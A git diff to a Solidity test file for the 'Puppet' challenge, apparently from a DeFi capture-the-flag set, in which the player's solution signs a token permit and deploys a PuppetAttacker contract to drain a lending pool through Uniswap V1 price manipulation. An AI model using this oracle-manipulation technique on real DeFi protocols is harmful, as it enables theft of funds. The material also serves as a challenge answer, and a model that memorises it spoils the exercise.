@@ -8,6 +8,8 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+import {PuppetAttacker} from "../../src/puppet/PuppetAttacker.sol";
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -92,7 +94,37 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+
+        console.log("my eth balance:", player.balance / 1 ether, player.balance % 1 ether);
+        console.log("my token balance:", token.balanceOf(player) / 1 ether, token.balanceOf(player ) % 1 ether);
+        console.log("");
+
+        // 트랜잭션 1회 제약조건을 맞추기 위한 컨트랙트 배포 공격. 배포 전 permit 준비
+
+        address attacker = vm.computeCreateAddress(player, vm.getNonce(player));
+        bytes32 messageHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                token.DOMAIN_SEPARATOR(),
+                keccak256(
+                    abi.encode(
+                        keccak256(
+                            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
+                        ),
+                        player,
+                        attacker,
+                        type(uint256).max,
+                        token.nonces(player),
+                        type(uint256).max
+                    )
+                )
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, messageHash);
+        new PuppetAttacker{ value: player.balance }(v, r, s, recovery, uniswapV1Exchange, token, lendingPool);
+    
+        console.log("after eth balance:", recovery.balance / 1 ether, recovery.balance % 1 ether);
+        console.log("after token balance:", token.balanceOf(recovery) / 1 ether, token.balanceOf(recovery) % 1 ether);
     }
 
     // Utility function to calculate Uniswap prices
